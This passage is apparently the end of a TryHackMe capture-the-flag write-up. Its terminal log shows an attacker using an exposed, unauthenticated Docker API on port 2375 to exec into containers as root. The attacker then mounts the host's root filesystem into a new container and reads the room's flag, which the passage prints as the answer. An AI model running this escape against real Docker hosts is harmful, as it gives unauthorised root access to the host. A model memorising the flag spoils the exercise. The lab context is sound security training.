debian                                        10-slim   4a9cd57610d6   2 years ago   69.2MB
registry.access.redhat.com/ubi8/ubi-minimal   8.3       7331d26c1fdf   2 years ago   103MB
alpine                                        3.9       78a2ce922f86   2 years ago   5.55MB

┌──(witty㉿kali)-[~/Downloads]
└─$ docker -H 10.10.85.253:2375 exec -it cb83912607b9 /bin/bash
bash-4.4$ whoami
quarkus
bash-4.4$ id
uid=1000(quarkus) gid=1000(quarkus) groups=1000(quarkus)
bash-4.4$ ls
application

┌──(witty㉿kali)-[~/Downloads]
└─$ docker -H 10.10.85.253:2375 exec -it 49fe455a9681 /bin/bash
root@docker-escape:/# id
uid=0(root) gid=0(root) groups=0(root)
root@docker-escape:/# ls
bin   dev		   docker-entrypoint.sh  home  lib64  mnt  proc  run   srv  tmp  var
boot  docker-entrypoint.d  etc			 lib   media  opt  root  sbin  sys  usr
root@docker-escape:/# cd root
root@docker-escape:~# ls
root@docker-escape:~# ls -lah
total 16K
drwx------ 2 root root 4.0K Dec  9  2020 .
drwxr-xr-x 1 root root 4.0K Jan  7  2021 ..
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
root@docker-escape:~# cd ..
root@docker-escape:/# ls
bin   dev		   docker-entrypoint.sh  home  lib64  mnt  proc  run   srv  tmp  var
boot  docker-entrypoint.d  etc			 lib   media  opt  root  sbin  sys  usr
root@docker-escape:/# cd mnt
root@docker-escape:/mnt# ls
root@docker-escape:/mnt# exit
exit
                                                                                                 
┌──(witty㉿kali)-[~/Downloads]
└─$ docker -H 10.10.85.253:2375 exec -it 49fe455a9681 /bin/bash
root@docker-escape:/# find / -type f -name flag.txt 2>/dev/null
root@docker-escape:/# ^C
root@docker-escape:/# exit

┌──(witty㉿kali)-[~/Downloads]
└─$ docker -H 10.10.85.253:2375 run -it -v /:/mnt/ 78a2ce922f86 /bin/sh
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/ # ls -lah /
total 64
drwxr-xr-x    1 root     root        4.0K Apr  7 20:54 .
drwxr-xr-x    1 root     root        4.0K Apr  7 20:54 ..
-rwxr-xr-x    1 root     root           0 Apr  7 20:54 .dockerenv
drwxr-xr-x    2 root     root        4.0K Apr 23  2020 bin
drwxr-xr-x    5 root     root         360 Apr  7 20:54 dev
drwxr-xr-x    1 root     root        4.0K Apr  7 20:54 etc
drwxr-xr-x    2 root     root        4.0K Apr 23  2020 home
drwxr-xr-x    5 root     root        4.0K Apr 23  2020 lib
drwxr-xr-x    5 root     root        4.0K Apr 23  2020 media
drwxr-xr-x   22 root     root        4.0K Jan  9  2021 mnt
drwxr-xr-x    2 root     root        4.0K Apr 23  2020 opt
dr-xr-xr-x   96 root     root           0 Apr  7 20:54 proc
drwx------    1 root     root        4.0K Apr  7 20:54 root
drwxr-xr-x    2 root     root        4.0K Apr 23  2020 run
drwxr-xr-x    2 root     root        4.0K Apr 23  2020 sbin
drwxr-xr-x    2 root     root        4.0K Apr 23  2020 srv
dr-xr-xr-x   13 root     root           0 Apr  7 20:54 sys
drwxrwxrwt    2 root     root        4.0K Apr 23  2020 tmp
drwxr-xr-x    7 root     root        4.0K Apr 23  2020 usr
drwxr-xr-x   11 root     root        4.0K Apr 23  2020 var
/ # cd /mnt/root
/mnt/root # ls
flag.txt
/mnt/root # cat flag.txt
Congrats, you found the real flag!

THM{c62517c0cad93ac93a92b1315a32d734}
/mnt/root # cd /;cat .dockerenv
/ 

```

Find the real root flag

*THM{c62517c0cad93ac93a92b1315a32d734}*

[[Lookback]]